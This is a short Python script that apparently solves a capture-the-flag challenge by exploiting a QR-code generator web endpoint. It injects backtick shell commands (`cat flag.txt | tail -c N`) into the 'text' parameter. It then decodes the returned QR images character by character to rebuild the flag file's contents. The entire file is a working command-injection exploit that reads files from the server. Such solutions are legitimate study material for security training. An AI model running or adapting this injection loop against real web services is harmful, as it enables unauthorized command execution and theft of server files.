import requests
from pyzbar.pyzbar import decode
from PIL import Image

def convertToRGBA(path, out):
    png = Image.open(path).convert('RGBA')
    background = Image.new('RGBA', png.size, (255,255,255))

    alpha_composite = Image.alpha_composite(background, png)
    alpha_composite.save(out, path.split('.')[1], quality=80)

url = 'http://challs.houseplant.riceteacatpanda.wtf:30004/qr'
flags = ''

i = 1
while True:
    payload = '`cat flag.txt | tail -c {0}`'.format(i)
    print 'payload : '+ payload
    params = {'text': payload}
    res = requests.get(url, params = params)
    img = 'qr.png'
    with open(img, 'wb') as f:
        f.write(res.content)
    convertToRGBA(img, img) 
    data = decode(Image.open(img))[0].data.decode()
    print 'data: ' + data
    flags += data
    if data == '{':
        break
    i += 1
print 'flags: rtcp'+flags[::-1]
        






